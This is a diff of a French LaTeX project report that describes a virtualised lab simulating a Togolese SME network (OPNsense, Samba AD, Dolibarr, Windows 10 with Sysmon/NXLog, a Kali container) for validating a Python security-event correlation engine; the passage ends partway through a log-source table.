@@ -14,8 +14,19 @@
 \usepackage{graphicx}
 \usepackage{float}
 \usepackage{parskip}
+\usepackage{enumitem}
+\usepackage{multirow}
+% Dans le préambule
+\usepackage{seqsplit}
+% ou
+\usepackage{url}
 
-\geometry{margin=2.5cm}
+\geometry{
+    left=1.5cm,
+    right=1.5cm,
+    top=1.5cm,
+    bottom=1.5cm
+}
 
 \hypersetup{
     colorlinks=true,
@@ -24,97 +35,123 @@
     urlcolor=blue!60!black
 }
 
-
+\lstset{
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    frame=single,
+    backgroundcolor=\color{gray!8},
+    rulecolor=\color{gray!40},
+    xleftmargin=1em,
+    xrightmargin=1em
+}
 
 \title{%
-    \large Projet de fin de formation — L3 Informatique et Systèmes\\[0.5em]
-    \LARGE Topologie et choix architecturaux\\
+   \\[0.5em]
+    \LARGE Topologie, choix architecturaux et protocole d'évaluation\\
+   
 }
 
 \date{Année universitaire 2025--2026}
-    
-
-
 
 \begin{document}
 
 \maketitle
-
 \newpage
 \tableofcontents
 \newpage
 
-% ============================================================
+%=============================================================
 \section{Contexte et objectif du laboratoire}
-% ============================================================
+%=============================================================
 
-Le présent document décrit et justifie la topologie réseau et les choix
-techniques du laboratoire virtualisé utilisé pour le projet
-\textit{NYX}. L'objectif du laboratoire
+Le présent document décrit et justifie la topologie réseau, les choix
+techniques, les scénarios d'attaque et le protocole d'évaluation du
+laboratoire virtualisé utilisé pour le projet \textit{Nyx}. L'objectif
 est de simuler fidèlement l'infrastructure numérique d'une petite ou moyenne
-entreprise (PME) togolaise afin de valider un moteur de corrélation d'événements
-de sécurité à développer en Python.
+entreprise (PME) togolaise afin de valider un moteur de corrélation
+d'événements de sécurité développé en Python et un module de réponse
+automatisée (SOAR).
 
 D'après la Stratégie nationale de cybersécurité 2024--2028 de l'Agence
 Nationale de la Cybersécurité du Togo (ANCy), les PME constituent une cible
 prioritaire des cyberattaquants en raison de leur adoption croissante des
-outils numériques et de leur faible maturité en sécurité \cite{ancy_strategie}.
-Le rapport Africa Cyberthreat Assessment 2025 d'INTERPOL identifie le phishing,
-la compromission de messagerie professionnelle (BEC) et l'exfiltration de
-données financières comme les menaces dominantes en Afrique de l'Ouest
-\cite{interpol2025}.
+outils numériques et de leur faible maturité en sécurité
+\cite{ancy_strategie}. Le rapport Africa Cyberthreat Assessment 2025
+d'INTERPOL identifie le phishing, la compromission de messagerie
+professionnelle (BEC) et l'exfiltration de données financières comme les
+menaces dominantes en Afrique de l'Ouest \cite{interpol2025}.
 
-Le laboratoire est entièrement virtualisé sur deux machines hôtes physiques
-(16~Go de RAM chacune) sous Fedora~44 et Pop~OS, en utilisant
-KVM/QEMU comme hyperviseur.
+La corrélation d'événements de sécurité est une technique qui consiste à
+regrouper des événements apparemment isolés en une séquence cohérente
+révélant une attaque en cours. Selon Splunk, la corrélation permet de
+réduire le bruit des alertes et d'identifier des schémas d'attaque
+complexes en rapprochant des données provenant de sources hétérogènes
+(logs système, réseau, applications) \cite{splunk_correlation}. De son
+côté, ITrust souligne l'importance d'un moteur de corrélation performant
+au sein d'un SIEM pour alimenter un SOC réactif, en insistant sur la
+nécessité de règles métier adaptées au contexte de l'entreprise
+\cite{itrust_siem}. Notre projet Nyx s'inscrit dans cette approche :
+le moteur Python implémente des règles de corrélation temporelles et
+séquentielles (types 1 à 3) qui s'appuient sur les données collectées
+par notre pipeline, conformément aux bonnes pratiques décrites dans ces
+références.
 
-% ============================================================
+Le laboratoire est entièrement virtualisé sous Fedora~44
+de 16~Go de RAM et 512~Go de disque, en
+utilisant KVM/QEMU comme hyperviseur.
+
+%=============================================================
 \section{Principes fondateurs de la topologie}
-% ============================================================
+%=============================================================
 
 Trois principes ont guidé la conception de la topologie.
 
-\textbf{Fidélité contextuelle.} Chaque composant du laboratoire correspond
-à un équipement réellement utilisé dans les PME de la région. L'objectif
-n'est pas de simuler un environnement générique, mais de reproduire les
-choix technologiques concrets des entreprises togolaises à budget contraint.
+\textbf{Fidélité contextuelle.} Chaque composant correspond à un équipement
+ou service réellement utilisé dans les PME de la région. L'objectif n'est
+pas de simuler un environnement générique, mais de reproduire les choix
+technologiques concrets des entreprises togolaises à budget contraint :
+pare-feu open source, serveur de fichiers Samba, ERP Dolibarr, postes
+Windows.
 
-\textbf{Visibilité réseau complète.} Tout le trafic entre machines du laboratoire
-doit traverser le pare-feu afin d'être journalisé. Cette contrainte impose
-qu'OPNsense soit le vrai \textit{gateway} du réseau interne, et non un simple
-composant périphérique.
+\textbf{Visibilité réseau complète.} Tout le trafic entre machines du
+laboratoire doit traverser le pare-feu afin d'être journalisé. Cette
+contrainte impose qu'OPNsense soit le vrai \textit{gateway} du réseau
+interne --- chaque VM a sa passerelle par défaut sur \texttt{10.0.1.1}.
+Aucun trafic ne peut circuler entre VMs sans passer par OPNsense.
 
 \textbf{Économie de ressources.} La topologie doit tenir dans 16~Go de RAM
-par machine hôte, en réservant une marge suffisante pour l'environnement de
-développement et les outils de supervision.
+par machine hôte en réservant une marge suffisante pour l'environnement de
+développement. Kali Linux est déployé en conteneur Docker éphémère plutôt
+qu'en VM dédiée pour économiser 2~Go de RAM libérables entre les scénarios
+d'attaque.
 
-% ============================================================
+%=============================================================
 \section{Topologie réseau}
-% ============================================================
+%=============================================================
 
 \subsection{Schéma général}
 
 Le réseau de laboratoire est un segment isolé \texttt{10.0.1.0/24} géré
 par libvirt sans accès direct à Internet depuis les VMs internes. OPNsense
 dispose d'une interface WAN connectée au réseau NAT libvirt pour permettre
-au module de réponse automatisée d'interroger les API de threat intelligence
-(AbuseIPDB, VirusTotal) depuis le SOC.
+au module SOAR d'interroger les API de threat intelligence (AbuseIPDB,
+VirusTotal) et d'appliquer des règles de blocage via son API REST.
 
-Chaque machine virtuelle Linux ou Windows dispose de deux interfaces réseau :
+Chaque VM Linux ou Windows dispose de deux interfaces réseau :
 \begin{itemize}
-    \item \texttt{eth0} (ou \texttt{enp1s0}) : réseau de gestion Vagrant
-          (\texttt{192.168.121.0/24}), utilisé exclusivement pour le
-          provisionnement Ansible et l'accès SSH de développement~;
-    \item \texttt{eth1} (ou \texttt{enp2s0}) : réseau de laboratoire isolé
-          (\texttt{10.0.1.0/24}), passerelle par défaut \texttt{10.0.1.1}
-          (OPNsense LAN).
+    \item \texttt{eth0} / \texttt{enp1s0} : réseau de gestion Vagrant
+    (\texttt{192.168.121.0/24}), utilisé exclusivement pour le provisionnement
+    Ansible et l'accès SSH de développement~;
+    \item \texttt{eth1} / \texttt{enp2s0} : réseau de laboratoire isolé
+    (\texttt{10.0.1.0/24}), passerelle par défaut \texttt{10.0.1.1}
+    (OPNsense LAN).
 \end{itemize}
 
 \begin{figure}[H]
     \centering
-    \includegraphics[width=1.05\linewidth]{Architecture.png}
-    \caption{Architecture finale du projet}
-    \label{fig:placeholder}
+    \includegraphics[width=\linewidth]{Architecture.png}
+    \caption{Architecture générale du laboratoire NyxSOC}
+    \label{fig:archi}
 \end{figure}
 
 \subsection{Inventaire des machines virtuelles}
@@ -123,322 +160,758 @@ Chaque machine virtuelle Linux ou Windows dispose de deux interfaces réseau :
 \centering
 \caption{Inventaire des machines virtuelles du laboratoire}
 \label{tab:vms}
-\begin{tabularx}{\textwidth}{lXllll}
-\toprule
-\textbf{VM} & \textbf{OS} & \textbf{RAM} & \textbf{Disque}
-            & \textbf{IP LAN} & \textbf{Rôle PME} \\
-\midrule
-OPNsense     & FreeBSD 26.x  & 1~Go  & 8~Go  & 10.0.1.1  & Routeur/pare-feu \\
-SOC          & Debian 12     & 2~Go  & 20~Go & 10.0.1.10 & Serveur de supervision \\
-Debian Server& Debian 12     & 2~Go  & 15~Go & 10.0.1.20 & Serveur de fichiers/AD \\
-Windows 10   & Windows 10    & 3~Go  & 40~Go & 10.0.1.30 & Poste employé \\
-Kali         & Docker (hôte) &      & —     & 10.0.1.50 & Attaquant simulé \\
-\midrule
-\textbf{Total} & & \textbf{8~Go} & \textbf{83~Go} & & \\
-\bottomrule
+\begin{tabularx}{\textwidth}{|l|X|l|l|l|l|}
+\hline
+\textbf{VM} & \textbf{OS} & \textbf{RAM} & \textbf{Disque} & \textbf{IP LAN} & \textbf{Rôle PME simulé} \\
+\hline
+OPNsense      & FreeBSD 26.1.6 & 1,5~Go  & 8~Go  & 10.0.1.1  & Routeur/pare-feu \\
+SOC           & Debian 13     & 2~Go  & 20~Go & 10.0.1.10 & Serveur de supervision \\
+Debian Server & Debian 13     & 3~Go & 30~Go & 10.0.1.20 & Serveur fichiers + AD + ERP \\
+Windows 10    & Windows 10    & 3~Go  & 50~Go & 10.0.1.30 & Poste employé \\
+Kali          & Docker (hôte) & ---*   & ---*   & 10.0.1.50 & Attaquant simulé \\
+\hline
+\textbf{Total VMs} & & \textbf{10~Go} & \textbf{110~Go} & & \\
+\hline
 \end{tabularx}
 \end{table}
 
-La marge disponible de 8~Go sur 16~Go couvre l'environnement hôte
+\noindent\small{* La RAM et espaces utilisés par Kali reste indéterminé en raison de son caractère éphémère.}
+
+\medskip
+La marge disponible de 10~Go sur 16~Go couvre l'environnement hôte
 (VS~Code, virt-manager, Wireshark) avec une réserve confortable.
 
-% ============================================================
+%=============================================================
 \section{Justification des choix par composant}
-% ============================================================
+%=============================================================
 
 \subsection{Hyperviseur : KVM/QEMU + libvirt}
 
 KVM est intégré au noyau Linux depuis la version 2.6.20 (2007).
 Contrairement à VirtualBox, il ne repose sur aucun module noyau tiers
 (DKMS) et ne nécessite aucune recompilation lors des mises à jour du
-noyau hôte \cite{kvm_kernel}. Sur Fedora~44 avec un noyau récent (7.0.12),
-cette stabilité est critique pour un projet dont la durée dépasse dix semaines.
+noyau hôte \cite{kvm_kernel}. Cette stabilité est critique pour un projet
+dont la durée dépasse dix semaines.
 
 libvirt fournit une API unifiée pour la gestion des VMs, des réseaux virtuels
-et des snapshots. vagrant-libvirt permet d'intégrer Vagrant dans cet
-écosystème sans sortir du provider KVM.
+et des snapshots. Vagrant avec le plugin \texttt{vagrant-libvirt} permet
+d'automatiser la création et le provisionnement des VMs via des scripts
+Ansible, garantissant la reproductibilité du laboratoire.
 
 \subsection{Pare-feu : OPNsense}
 
 \begin{table}[H]
 \centering
-\caption{Comparaison des solutions de pare-feu pour le laboratoire}
+\caption{Comparaison des solutions de pare-feu}
 \label{tab:firewall}
-\begin{tabularx}{\textwidth}{lXXX}
-\toprule
+\begin{tabularx}{\textwidth}{|l|X|X|X|}
+\hline
 \textbf{Critère} & \textbf{OPNsense} & \textbf{pfSense} & \textbf{Alpine Linux} \\
-\midrule
-Licence          & BSD libre         & Netgate (restrictions depuis 2023) & MIT \\
-Interface web    & Oui, native       & Oui, native       & Non (scripts manuels) \\
-Export syslog    & Natif GUI         & Natif GUI         & Configuration manuelle \\
-API REST         & Oui (OPNsense API)& Limitée           & Non \\
-Logs filterlog   & Oui               & Oui               & Non standard \\
-Réalisme PME     & Élevé             & Élevé             & Faible \\
-\bottomrule
+\hline
+Licence       & BSD libre & Netgate (restr. 2023) & MIT \\
+Interface web & Oui, native & Oui, native & Non \\
+Export syslog & Natif GUI & Natif GUI & Manuel \\
+API REST      & Oui & Limitée & Non \\
+filterlog     & Oui & Oui & Non standard \\
+Réalisme PME  & Élevé & Élevé & Faible \\
+\hline
 \end{tabularx}
 \end{table}
 
-OPNsense est retenu pour trois raisons. Premièrement, son interface web
-permet de configurer l'export syslog sans écriture de scripts, ce qui réduit
-la complexité d'infrastructure. Deuxièmement, son API REST est utilisée par
-le module de réponse automatisée pour injecter des règles de blocage dynamiques.
-Troisièmement, pfSense a introduit des restrictions de redistribution depuis
-son rachat par Netgate en 2023, ce qui le rend inadapté à un projet académique
-open source \cite{pfsense_netgate}.
+OPNsense est retenu pour trois raisons. Son interface web permet de
+configurer l'export syslog sans scripts. Son API REST est utilisée par
+le module SOAR pour injecter des règles de blocage dynamiques. pfSense
+a introduit des restrictions de redistribution depuis son rachat par
+Netgate en 2023 \cite{pfsense_netgate}.
 
-\subsection{Système d'exploitation des serveurs Linux : Debian 12}
+\subsection{Système d'exploitation Linux : Debian 13}
 
-Debian est retenu à la place d'Ubuntu Server pour l'ensemble des VMs Linux
-(SOC et Debian Server). Debian suit une philosophie minimaliste~: aucun service
-superflu n'est installé par défaut, ce qui réduit le bruit dans les logs système
-et rend les mesures de performance plus précises. Python~3.12, rsyslog, Samba~4
-et Apache~2 sont disponibles dans les dépôts officiels sans nécessiter de PPA ( Personal Package Archive )
-additionnels \cite{debian_stable}.
-
-L'homogénéité du système d'exploitation entre les deux serveurs Linux simplifie
-également la maintenance et la reproductibilité du laboratoire.
+Debian est retenu à la place d'Ubuntu Server pour les deux VMs Linux
+(SOC et Debian Server). Debian suit une philosophie minimaliste : aucun
+service superflu n'est installé par défaut, ce qui réduit le bruit dans
+les logs système et rend les mesures de performance plus précises.
+Python~3.12, rsyslog, Samba~4, Apache~2 et Docker sont disponibles dans
+les dépôts officiels sans PPA additionnels \cite{debian_stable}.
 
 \subsection{Debian Server : Samba 4 AD + Apache + Dolibarr}
 
 \subsubsection{Samba 4 en mode Active Directory Domain Controller}
 
-Les PME togolaises qui centralisent l'authentification de leurs postes de travail
-utilisent soit Windows Server AD (coût de licence prohibitif), soit Samba~4 en
-mode DC, qui implémente le protocole Kerberos et LDAP (Lightweight Directory Access Protocol) de manière compatible avec
-Active Directory \cite{samba4_ad}. Samba~4 AD permet à Windows~10 de rejoindre
-le domaine, ce qui génère des Event IDs Kerberos (4768, 4769) corrélables avec
-les accès aux partages SMB côté serveur.
+Les PME togolaises qui centralisent l'authentification utilisent soit
+Windows Server AD (coût prohibitif), soit Samba~4 en mode DC, qui
+implémente Kerberos et LDAP de manière compatible avec Active Directory
+\cite{samba4_ad}. Windows~10 rejoint le domaine Samba, ce qui génère des
+Event IDs Kerberos (4768, 4769) corrélables avec les accès aux partages
+SMB côté serveur.
 
-Les partages de fichiers simulés représentent les données sensibles d'une PME~:
-documents de direction, relevés Mobile Money, fichiers comptables. Ces données
-sont la cible du scénario d'exfiltration S2.
+\subsubsection{Partages de fichiers et utilisateurs simulés}
 
-La RAM allouée à Debian Server est portée à 2~Go pour absorber le chargement
-des processus Samba~4 AD (smbd, nmbd, winbindd, samba-ad-dc) et du serveur web
-simultanément.
+Quatre partages Samba reproduisent l'organisation documentaire d'une PME
+togolaise :
 
-\subsubsection{Apache + Dolibarr}
+\begin{itemize}
+    \item \texttt{direction/} — documents confidentiels, contrats,
+    décisions stratégiques. Accessible uniquement au groupe
+    \texttt{direction}.
+    \item \texttt{comptabilite/} — relevés Mobile Money, factures,
+    bilans financiers. Accessible uniquement au groupe
+    \texttt{comptabilite}. Contient les données cibles du scénario~S2.
+    \item \texttt{technique/} — configurations, scripts, documentation
+    interne. Accessible uniquement au groupe \texttt{technique}.
+    \item \texttt{commun/} — zone d'échange transversale accessible
+    à tous les groupes. Point d'entrée des payloads dans les
+    scénarios S3 et S4 (YARA).
+\end{itemize}
+
+Trois utilisateurs Windows~10 sont créés et joints au domaine Samba AD,
+chacun rattaché à un groupe distinct : \texttt{dir1} (direction),
+\texttt{compta1} (comptabilite), \texttt{tech1} (technique). Des scripts
+PowerShell simulent les comportements métier pendant les scénarios
+d'attaque : accès aux partages, copie de fichiers, ouverture de documents.
+Ce mécanisme évite toute interaction humaine manuelle pendant les tests
+et garantit la reproductibilité des scénarios.
+
+Un quatrième utilisateur \texttt{soc\_reader} dispose d'un accès en
+lecture seule sur l'ensemble des partages. Le SOC monte ces quatre
+partages en permanence via CIFS (\texttt{/mnt/samba/}) afin que le
+scanner YARA puisse analyser tout fichier déposé sur le réseau,
+indépendamment du partage concerné et de l'extension du fichier.
+
+\subsubsection{Apache + Dolibarr via Docker Compose}
 
 Dolibarr est l'ERP open source le plus déployé dans les PME d'Afrique
-francophone~: facturation, gestion commerciale, documents internes \cite{dolibarr}.
-Son déploiement sur Apache dans le laboratoire reproduit fidèlement
-l'infrastructure applicative d'une PME togolaise disposant d'un budget logiciel
-limité. Les logs d'accès Apache (\texttt{/var/log/apache2/access.log}) constituent
-une source supplémentaire pour les scénarios d'attaque ciblant l'application web.
+francophone : facturation, gestion commerciale, documents internes
+\cite{dolibarr}. Il est déployé via l'image Docker officielle
+\texttt{tuxgasy/dolibarr} avec un \texttt{docker-compose.yml} incluant
+MariaDB. Ce choix élimine toute configuration manuelle de l'application
+tout en produisant un environnement fonctionnel en moins d'une heure.
 
-\subsection{Windows 10}
+\textbf{Gestion des logs Docker vers rsyslog.} Les logs Apache dans un
+conteneur Docker sont émis sur \texttt{stdout}/\texttt{stderr} du conteneur,
+pas dans \texttt{/var/log/apache2/}. Pour que rsyslog puisse les forwarder
+vers le SOC, le driver de logging Docker est configuré en mode
+\texttt{syslog} dans \texttt{docker-compose.yml} :
 
-\subsubsection{Choix de la version}
+\begin{lstlisting}
+services:
+  dolibarr:
+    logging:
+      driver: syslog
+      options:
+        syslog-address: "udp://127.0.0.1:514"
+        tag: "apache2"
+\end{lstlisting}
 
-Windows~10 est retenu plutôt que Windows~11 pour trois raisons~:
-consommation mémoire inférieure (Windows~11 consomme environ 500~Mo de plus
-au repos), absence d'exigences matérielles restrictives (TPM~2.0, Secure Boot)
-qui compliquent la virtualisation KVM, et représentativité du parc informatique
-des PME togolaises où Windows~10 reste majoritaire \cite{statcounter_africa}.
+rsyslog reçoit ces entrées sur \texttt{localhost:514} et les inclut dans
+le flux forwardé vers le SOC avec la facility \texttt{daemon}.
 
-\subsubsection{Allocation mémoire}
+\subsection{Windows 10 : Sysmon + NXLog}.
+\subsubsection{Choix de Windows 10}
+Windows~10 est retenu pour des raisons de contrainte de ressources
+et de simplicité de virtualisation. Sous KVM, Windows~11 nécessite
+l'émulation TPM~2.0 via \texttt{swtpm} et le firmware UEFI
+\texttt{OVMF} pour Secure Boot, ce qui ajoute une complexité
+d'infrastructure sans valeur ajoutée pour les objectifs de détection
+du projet. Windows~10 représente par ailleurs 22,99~\% du parc
+Windows au Togo en mai~2026 \cite{statcounter_togo} et reste
+majoritaire dans les PME à budget contraint, ce qui maintient la
+pertinence contextuelle du choix. Les Event IDs collectés
+(Tableau~\ref{tab:eventids}) sont identiques entre les deux versions.
 
-3~Go sont alloués à Windows~10. Cette valeur tient compte de la
-consommation au repos (environ 1,8--2,2~Go selon les processus background~:
-Windows Update, Defender, télémétrie), du driver kernel Sysmon actif en
-permanence, et de NXLog Community Edition pour le transfert des logs.
-Une allocation de 2~Go provoquerait un swap constant qui fausserait
-les métriques de détection.
-
-\subsection{Collecte des logs Windows}
-La stack retenue pour la collecte des logs de Windows est la combinaison \textbf{NXLog + Sysmon}.
-
-\subsubsection{NXLog Community Edition}
-\begin{table}[H]
-\centering
-\caption{Comparaison des agents de collecte de logs Windows}
-\label{tab:nxlog}
-\begin{tabularx}{\textwidth}{lXXX}
-\toprule
-\textbf{Critère} & \textbf{NXLog CE} & \textbf{Winlogbeat} & \textbf{Elastic Agent} \\
-\midrule
-Output UDP syslog & Natif (\texttt{om\_udp}) & Non natif & Non natif \\
-Dépendance stack  & Aucune          & ELK Stack requis  & ELK Stack requis \\
-Configuration     & Blocs input/output& YAML simple      & YAML + Fleet \\
-Windows legacy    & XP → 11         & 7+ (partiel)      & 10+ \\
-Poids             & Léger           & Léger             & Lourd \\
-Licence           & CE gratuite     & Apache 2.0        & Elastic (restrictions) \\
-\bottomrule
-\end{tabularx}
-\end{table}
-
-NXLog Community Edition est retenu parce que le pipeline de collecte
-cible rsyslog UDP~514 sur le SOC, pas Elasticsearch. Winlogbeat et Elastic Agent
-sont conçus nativement pour la stack ELK~; les faire parler UDP syslog est
-non documenté et contre-nature. NXLog dispose d'un module \texttt{om\_udp}
-natif et est le standard industriel pour la collecte de logs Windows
-vers des SIEM non-ELK \cite{nxlog_docs}.
+\subsubsection{Utilisateurs}
+Afin de simuler des employés multiples qui se connectent au serveur samba et o dolibarr comme prévu plus haut , 3 utilisateurs seront créés sur cette machine.
+\begin{lstlisting}
+Trois utilisateurs joints au domaine Samba AD :
+    dir1      : groupe direction
+    compta1   : groupe comptabilite  
+    tech1     : groupe technique
+\end{lstlisting}
+Afin de pouvoir simuler un traffic normal venant de manière imprévisible , un ou des scripts powershell tournera sur trois connexions distinctes .
 
 \subsubsection{Sysmon}
 
 Sysmon (System Monitor) est un service Microsoft Sysinternals qui enrichit
-la journalisation Windows en capturant des événements de bas niveau~:
-création de processus (Event ID~1), connexions réseau (Event ID~3),
-création de fichiers (Event ID~11), entre autres \cite{sysmon_docs}.
-Les Event IDs natifs Windows (4624 logon réussi, 4625 échec de logon,
-4688 création de processus) ne fournissent pas le hash du processus ni
-le chemin complet de l'exécutable — informations essentielles pour la
-détection de fichiers malveillants via YARA.
+la journalisation Windows en capturant des événements de bas niveau
+\cite{sysmon_docs}. Les Event IDs natifs Windows (4624, 4625, 4688) ne
+fournissent pas le hash du processus ni le chemin complet de l'exécutable
+--- informations essentielles pour la détection de fichiers malveillants
+via YARA. La configuration Sysmon retenue s'inspire de la référence
+communautaire SwiftOnSecurity \cite{swifton}, filtrée pour ne conserver
+que les Event IDs pertinents pour les quatre scénarios :
 
-La configuration Sysmon retenue s'inspire de la référence communautaire
-SwiftOnSecurity \cite{swifton}, filtrée pour ne conserver que les Event IDs
-pertinents pour les scénarios S1, S2 et S3~: 1, 3, 11 (Sysmon) et
-4624, 4625, 4768, 4769 (Windows natif).
+\begin{table}[H]
+\centering
+\caption{Event IDs collectés sur Windows 10}
+\label{tab:eventids}
+\begin{tabularx}{\textwidth}{|l|l|X|}
+\hline
+\textbf{Source} & \textbf{Event ID} & \textbf{Événement} \\
+\hline
+Windows natif & 4624 & Logon réussi \\
+Windows natif & 4625 & Échec de logon \\
+Windows natif & 4768 & Demande ticket Kerberos (TGT) \\
+Windows natif & 4769 & Demande ticket de service Kerberos \\
+Sysmon & 1  & Création de processus (avec hash et ligne de commande) \\
+Sysmon & 2  & Détection de l'heure de modification d'un fichier sur le disque\\
+Sysmon & 3  & Connexion réseau sortante \\
+Sysmon & 11 & Création de fichier (avec chemin complet) \\
+\hline
+\end{tabularx}
+\end{table}
+
+Tous les autres Event IDs sont filtrés au niveau de NXLog pour ne pas
+saturer le pipeline avec du bruit non pertinent pour les scénarios.
+
+\subsubsection{NXLog Community Edition}
+
+\begin{table}[H]
+\centering
+\caption{Comparaison des agents de collecte de logs Windows}
+\label{tab:nxlog}
+\begin{tabularx}{\textwidth}{|l|X|X|X|}
+\hline
+\textbf{Critère} & \textbf{NXLog CE} & \textbf{Winlogbeat} & \textbf{Elastic Agent} \\
+\hline
+Output UDP syslog & Natif (\texttt{om\_udp}) & Non natif & Non natif \\
+Dépendance stack  & Aucune & ELK Stack & ELK Stack \\
+Windows legacy    & XP à 11 & 7+ partiel & 10+ \\
+Licence           & CE gratuite & Apache 2.0 & Elastic (restr.) \\
+\hline
+\end{tabularx}
+\end{table}
+
+NXLog CE est retenu parce que le pipeline cible rsyslog UDP~514 sur le
+SOC, pas Elasticsearch. Winlogbeat et Elastic Agent sont conçus nativement
+pour la stack ELK --- les faire parler UDP syslog est non documenté et
+contre-nature \cite{nxlog_docs}.
+
+La configuration NXLog filtre les Event IDs avant transmission et convertit
+le format XML Windows en syslog RFC~5424 encapsulant le XML original,
+que \texttt{windows\_parser.py} déshabillera en deux couches.
 
 \subsection{Attaquant simulé : Kali Linux en conteneur Docker}
 
-L'attaquant simulé (Kali Linux) est déployé en conteneur Docker sur la machine
-hôte Fedora plutôt qu'en machine virtuelle dédiée. Cette approche est
-justifiée par le rôle fonctionnel de Kali dans le laboratoire~: lancer des
-attaques scriptées et déterministes, pas simuler un poste de travail persistant.
-
-Les avantages sont substantiels~: économie d'environ 1~Go de RAM libérée pour
-les autres VMs, caractère éphémère (le conteneur est détruit après chaque
-scénario d'attaque, ce qui évite toute persistance d'état non désirée),
-et disponibilité d'une image officielle \texttt{kalilinux/kali-rolling}
-maintenue par Offensive Security \cite{kali_docker}.
+Kali Linux est déployé en conteneur Docker sur la machine hôte plutôt
+qu'en VM dédiée. L'attaquant simulé a un rôle fonctionnel précis et
+temporaire : lancer des attaques scriptées et déterministes. Il ne
+nécessite pas d'interface graphique, de persistance entre sessions, ou
+d'un OS complet. L'image officielle \texttt{kalilinux/kali-rolling}
+maintenue par Offensive Security \cite{kali_docker} fournit tous les
+outils nécessaires.
 
 L'accès au réseau \texttt{10.0.1.0/24} est assuré par un réseau Docker
-macvlan connecté au bridge libvirt \texttt{isolated}, ce qui attribue
-à Kali l'adresse \texttt{10.0.1.50} directement visible des autres VMs
-et d'OPNsense.
+macvlan connecté au bridge libvirt isolé, ce qui attribue à Kali
+l'adresse \texttt{10.0.1.50} directement visible des autres VMs et
+d'OPNsense.
 
-\textbf{Justification du placement dans le LAN.} Forcer l'attaquant
-à entrer par le WAN d'OPNsense ajouterait une complexité de configuration
-(NAT, port forwarding, règles entrantes) sans valeur ajoutée pour les
-hypothèses de recherche. Ce projet valide un moteur de \textit{corrélation}
-d'événements, pas la robustesse d'un pare-feu face à des attaques externes.
-Le placement de Kali dans le LAN simule un vecteur réaliste et documenté~:
-menace interne ou accès VPN compromis, que le rapport INTERPOL 2025 identifie
-comme prépondérant dans les incidents africains \cite{interpol2025}.
+\textbf{Justification du placement dans le LAN.} Ce projet valide un
+moteur de corrélation d'événements, pas la robustesse d'un pare-feu
+face à des attaques externes. Forcer l'attaquant à entrer par le WAN
+ajouterait une complexité de configuration sans valeur pour les
+hypothèses de recherche. Le placement de Kali dans le LAN simule un
+vecteur réaliste et documenté : menace interne ou accès compromis,
+que le rapport INTERPOL~2025 identifie comme prépondérant dans les
+incidents africains \cite{interpol2025}.
 
-\subsection{Synchronisation temporelle : Chrony}
+\subsection{Synchronisation temporelle : Chrony et W32tm}
 
-La précision temporelle est critique pour le moteur de corrélation~: une
-dérive de 5~secondes sur une fenêtre de corrélation de 60~secondes représente
-8\% d'erreur et peut provoquer des faux négatifs. Chrony est retenu à la place
-du client NTP traditionnel (\texttt{ntpd}) pour sa capacité à converger
-rapidement même après un redémarrage et à maintenir une précision submilliseconde
-dans un environnement virtualisé \cite{chrony_docs}.
+La précision temporelle est critique pour le moteur de corrélation :
+une dérive de 5~secondes sur une fenêtre de 60~secondes représente
+8~\% d'erreur et peut provoquer des faux négatifs sur les règles à
+seuil. Chrony est retenu sur toutes les VMs Linux pour sa capacité
+à converger rapidement après un redémarrage et à maintenir une
+précision submilliseconde en environnement virtualisé \cite{chrony_docs}.
 
-Chrony est installé sur toutes les VMs Linux. Sur Windows~10, la
-synchronisation NTP est assurée par le service \texttt{W32tm} configuré
-pour pointer vers \texttt{10.0.1.1} (OPNsense, qui synchronise lui-même
-via son service NTP intégré).
+Sur Windows~10, la synchronisation NTP est assurée par le service
+\texttt{W32tm} configuré pour pointer vers \texttt{10.0.1.1}
+(OPNsense, qui synchronise lui-même via son service NTP intégré) :
+
+\begin{lstlisting}
+w32tm /config /manualpeerlist:"10.0.1.1" /syncfromflags:manual /update
+net stop w32tm && net start w32tm
+\end{lstlisting}
+
+La synchronisation est validée avant chaque scénario d'attaque par
+\texttt{chronyc tracking} sur Linux et \texttt{w32tm /query /status}
+sur Windows.
 
 \subsection{Transport syslog : UDP}
 
-Le protocole UDP est retenu pour le transport syslog entre toutes les sources
-et le SOC. Dans un réseau isolé de laboratoire avec peu de sources simultanées,
-la garantie de livraison apportée par TCP n'est pas nécessaire. UDP élimine
-tout overhead de connexion et ne peut pas bloquer rsyslog si le SOC est
-momentanément saturé~; TCP introduirait un risque de back-pressure qui
-perturberait la collecte pendant les pics d'événements (notamment lors des
-scénarios de brute-force SSH) \cite{rsyslog_udp}.
+Le protocole UDP est retenu pour le transport syslog entre toutes les
+sources et le SOC. Dans un réseau isolé de laboratoire, la garantie de
+livraison apportée par TCP n'est pas nécessaire. UDP élimine tout overhead
+de connexion et ne peut pas bloquer rsyslog si le SOC est momentanément
+saturé. TCP introduirait un risque de back-pressure perturbant la collecte
+pendant les pics d'événements (notamment lors des scénarios de brute-force
+SSH) \cite{rsyslog_udp}.
 
-% ============================================================
+%=============================================================
 \section{Pipeline de collecte des logs}
-% ============================================================
+%=============================================================
 
-\subsection{Sources et formats}
+\subsection{Sources, formats et configuration}
 
 \begin{table}[H]
 \centering
 \caption{Sources de logs, formats et événements collectés}
 \label{tab:sources}
-\begin{tabularx}{\textwidth}{lllX}
-\toprule
-\textbf{Source} & \textbf{Format} & \textbf{Transport} & \textbf{Événements clés} \\
-\midrule
-Debian Server   & syslog RFC 5424 & rsyslog UDP 514
-  & \texttt{auth/authpriv} (SSH, PAM, sudo),
-    \texttt{daemon} (Samba accès/échecs) \\
-Windows 10      & XML EventLog + Sysmon & NXLog → UDP 514
-  & 4624/4625 (logon), 4688 (process), 4663 (file access),
-    Sysmon 1/3/11 \\
-OPNsense        & filterlog BSD   & syslog UDP 514
+\begin{tabularx}{\textwidth}{|l|l|X|}
+\hline
+\textbf{Source} & \textbf{Format / Transport} & \textbf{Événements clés} \\
+\hline
+Debian Server
+  & syslog RFC~5424 / rsyslog UDP~514
+  & \texttt{auth/authpriv} : SSH, PAM, sudo~;
+    \texttt{daemon} : Samba accès/échecs~;
+    \texttt{daemon} : Dolibarr via driver Docker syslog \\
+\hline
+Windows 10
+  & XML EventLog + Sysmon / NXLog UDP~514
+  & 4624/4625 (logon), 4768/4769 (Kerberos),
+    Sysmon 1 (process), 3 (net), 11 (file) \\
+\hline
+OPNsense
+  & filterlog BSD / syslog UDP~514
   & Trafic filtré, scans réseau, connexions bloquées \\
-Apache (Dolibarr)& Combined Log Format & rsyslog UDP 514
-  & Requêtes HTTP, codes d'erreur, IP source \\
-\bottomrule
+\hline
